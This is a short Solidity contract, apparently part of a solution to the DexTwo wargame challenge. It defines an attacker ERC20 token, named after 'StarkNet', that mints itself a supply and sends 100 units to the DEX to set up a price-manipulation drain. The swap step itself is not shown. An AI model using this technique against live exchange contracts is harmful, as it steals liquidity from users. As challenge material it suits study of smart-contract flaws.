// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./DexTwo.sol";

contract DexTwoTokenAttacker is ERC20 {
    DexTwo public dexTwo;

    constructor() ERC20("StarkNet", "STRK") {
        _mint(msg.sender, 400);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function sendTokenstoDex(address _dexTwo) external {
        transfer(_dexTwo, 100);
    }
}
